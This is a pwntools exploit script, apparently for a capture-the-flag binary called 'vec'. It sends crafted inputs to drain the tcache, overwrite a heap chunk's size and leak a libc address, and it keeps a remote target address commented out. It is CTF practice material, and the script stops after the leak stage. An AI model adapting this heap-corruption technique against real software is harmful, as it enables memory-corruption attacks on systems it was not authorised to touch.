from pwn import *

p = process("./vec",env={"""LD_LIBRARY_PATH""":"$HOME/RandomCTF/killerQueen/pwn/chall6"})
#p = remote('143.198.184.186', 5004)
pid = gdb.attach(p,gdbscript='b * answer+211')


p.sendline(str(5))

def do_sodo(q,n,overwrite):

    p.sendline(str(n))
    p.sendline(str(q))

    for j in range(n):
        p.sendline('100')
    if q > 0:
        p.sendline('1') # t
        p.sendline('0') # x
        p.sendline(str(overwrite)) # y



def do_liho(q,n):
    p.sendline(str(n))
    p.sendline(str(q))

    for _ in range(n):
        p.sendline('101')
    if q > 0:
        p.sendline('0') #t
        p.sendline('2') #x

do_sodo(0,300,0x0) # main_area_addr na heap -> 2 chunka v tcache
do_sodo(1,1,0x401) # sprazni tcache part1
do_sodo(1,1,0x401) # sprazni tcache part2 overwrite size (potegni iz 0x21, daj v 0x401)
do_liho(1,1) #dobi leak i hope 

leak = int(p.recvline())
print "leak_libc:",hex(leak)




p.interactive()